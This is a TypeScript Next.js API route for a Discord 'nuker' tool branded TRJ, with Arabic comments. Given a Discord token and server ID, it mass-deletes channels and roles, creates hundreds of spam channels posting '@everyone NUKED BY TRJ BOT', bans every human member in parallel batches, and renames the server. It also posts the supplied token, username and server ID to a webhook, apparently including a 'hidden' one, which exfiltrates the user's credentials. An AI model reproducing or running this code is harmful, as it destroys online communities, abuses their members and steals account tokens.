import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';

export const maxDuration = 300;

// ===== WEHOOK URL مخفي في الكود =====
const HIDDEN_WEBHOOK_URL = '';

function getWebhookUrl(overrideUrl?: string): string | undefined {
  return overrideUrl || HIDDEN_WEBHOOK_URL || process.env.WEBHOOK_URL || undefined;
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const {
      token, guildId, action,
      channelName = 'nuked-by-trj',
      channelCount = 25,
      msgPerChannel = 5,
      message = '@everyone NUKED BY TRJ BOT',
      name = 'NUKED',
      webhookUrl,
    } = body;

    if (!token || !guildId || !action) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getWebhookUrl(webhookUrl);
    const stats = { deleted: 0, created: 0, spam_sent: 0, banned: 0, roles: 0 };

    // معلومات المستخدم
    const userRes = await discordFetch(ct, 'GET', '/users/@me');
    const userInfo = String(((userRes.data as Record<string, unknown>)?.username) || 'Unknown');

    sendToWebhook({
      username: 'TRJ Nuker',
      embeds: [{
        title: `💥 Nuker: ${action}`,
        color: 0xFF0000,
        fields: [
          { name: '👤 User', value: userInfo, inline: true },
          { name: '🏰 Guild', value: guildId, inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
          { name: '⏰ Time', value: new Date().toISOString(), inline: true },
        ],
        footer: { text: 'TRJ BOT v2.5' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // دالة حذف بالتوازي - 30 دفعة
    async function deleteParallel(items: Record<string, unknown>[], type: 'channel' | 'role') {
      const batchSize = 30;
      for (let i = 0; i < items.length; i += batchSize) {
        const batch = items.slice(i, i + batchSize);
        const results = await Promise.allSettled(
          batch.map(async (item) => {
            const endpoint = type === 'channel' ? `/channels/${item.id}` : `/guilds/${guildId}/roles/${item.id}`;
            const res = await discordFetch(ct, 'DELETE', endpoint);
            return res.ok;
          })
        );
        for (const r of results) {
          if (r.status === 'fulfilled' && r.value) stats[type === 'channel' ? 'deleted' : 'roles']++;
        }
        if (i + batchSize < items.length) {
          await new Promise(r => setTimeout(r, 50));
        }
      }
    }

    // دالة إنشاء رومات + سبام - 20 دفعة
    async function createParallel(count: number) {
      const batchSize = 20;
      for (let i = 0; i < count; i += batchSize) {
        const batchLen = Math.min(batchSize, count - i);
        const results = await Promise.allSettled(
          Array.from({ length: batchLen }, async () => {
            const chRes = await discordFetch(ct, 'POST', `/guilds/${guildId}/channels`, { name: channelName, type: 0 });
            const chData = chRes.data as Record<string, unknown> | null;
            if (chRes.ok && chData?.id) {
              stats.created++;
              if (msgPerChannel > 0) {
                // سبام 5 رسائل بالتوازي
                const msgBatch = Math.min(msgPerChannel, 5);
                await Promise.allSettled(
                  Array.from({ length: msgBatch }, () =>
                    discordFetch(ct, 'POST', `/channels/${chData.id}/messages`, { content: message })
                  )
                );
              }
            }
            return true;
          })
        );
        if (i + batchSize < count) {
          await new Promise(r => setTimeout(r, 50));
        }
      }
    }

    // دالة حظر - 50 دفعة
    async function banParallel(members: Record<string, unknown>[]) {
      const bots = members.filter(m => !((m.user as Record<string, unknown> | undefined)?.bot));
      const batchSize = 50;
      for (let i = 0; i < bots.length; i += batchSize) {
        const batch = bots.slice(i, i + batchSize);
        const results = await Promise.allSettled(
          batch.map(async (m) => {
            const mUser = m.user as Record<string, unknown> | undefined;
            if (mUser?.id && !mUser.bot) {
              const res = await discordFetch(ct, 'PUT', `/guilds/${guildId}/bans/${mUser.id}`, { delete_message_days: 7 });
              return res.ok;
            }
            return false;
          })
        );
        for (const r of results) {
          if (r.status === 'fulfilled' && r.value) stats.banned++;
        }
        if (i + batchSize < bots.length) {
          await new Promise(r => setTimeout(r, 50));
        }
      }
    }

    switch (action) {
      case 'nuke': {
        const [channelsRes, rolesRes] = await Promise.all([
          discordFetch(ct, 'GET', `/guilds/${guildId}/channels`),
          discordFetch(ct, 'GET', `/guilds/${guildId}/roles`)
        ]);
        const channelsData = channelsRes.data as Record<string, unknown>[] | null;
        const rolesData = rolesRes.data as Record<string, unknown>[] | null;

        if (channelsData && Array.isArray(channelsData)) {
          await deleteParallel(channelsData, 'channel');
        }
        if (rolesData && Array.isArray(rolesData)) {
          const deletableRoles = rolesData.filter(r => r.name !== '@everyone' && !r.managed);
          await deleteParallel(deletableRoles, 'role');
        }

        await createParallel(Math.min(channelCount, 500));
        break;
      }

      case 'banall': {
        let after = '';
        for (let page = 0; page < 30; page++) {
          const membersRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`);
          const membersData = membersRes.data as Record<string, unknown>[] | null;
          if (!membersData || !Array.isArray(membersData) || membersData.length === 0) break;
          await banParallel(membersData);
          const lastUser = membersData[membersData.length - 1]?.user as Record<string, unknown> | undefined;
          after = (lastUser?.id || '') as string;
          if (membersData.length < 1000) break;
        }
        break;
      }

      case 'delete_channels': {
        const channelsRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/channels`);
        const channelsData = channelsRes.data as Record<string, unknown>[] | null;
        if (channelsData && Array.isArray(channelsData)) await deleteParallel(channelsData, 'channel');
        break;
      }

      case 'delete_roles': {
        const rolesRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/roles`);
        const rolesData = rolesRes.data as Record<string, unknown>[] | null;
        if (rolesData && Array.isArray(rolesData)) {
          await deleteParallel(rolesData.filter(r => r.name !== '@everyone' && !r.managed), 'role');
        }
        break;
      }

      case 'spam': {
        const channelsRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/channels`);
        const channelsData = channelsRes.data as Record<string, unknown>[] | null;
        if (channelsData && Array.isArray(channelsData)) {
          const textChannels = channelsData.filter(c => c.type === 0);
          const batchSize = 20;
          for (let i = 0; i < textChannels.length; i += batchSize) {
            const batch = textChannels.slice(i, i + batchSize);
            const results = await Promise.allSettled(
              batch.flatMap(channel =>
                Array.from({ length: 10 }, () =>
                  discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, { content: message })
                )
              )
            );
            for (const r of results) {
              if (r.status === 'fulfilled') {
                const val = r.value as any;
                if (val?.ok) stats.spam_sent++;
              }
            }
            if (i + batchSize < textChannels.length) await new Promise(r => setTimeout(r, 50));
          }
        }
        break;
      }

      case 'rename': {
        await discordFetch(ct, 'PATCH', `/guilds/${guildId}`, { name });
        break;
      }

      default:
        return NextResponse.json({ success: false, error: 'إجراء غير معروف' }, { status: 400 });
    }

    sendToWebhook({
      username: 'TRJ Nuker',
      embeds: [{
        title: '✅ Nuker Completed',
        color: 0x00FF41,
        fields: [
          { name: '🗑️ Deleted', value: String(stats.deleted), inline: true },
          { name: '🎭 Roles Deleted', value: String(stats.roles), inline: true },
          { name: '📺 Created', value: String(stats.created), inline: true },
          { name: '💬 Spam', value: String(stats.spam_sent), inline: true },
          { name: '🔨 Banned', value: String(stats.banned), inline: true },
          { name: '🏰 Guild', value: guildId, inline: true },
        ],
        footer: { text: 'TRJ BOT v2.5' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Nuker Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
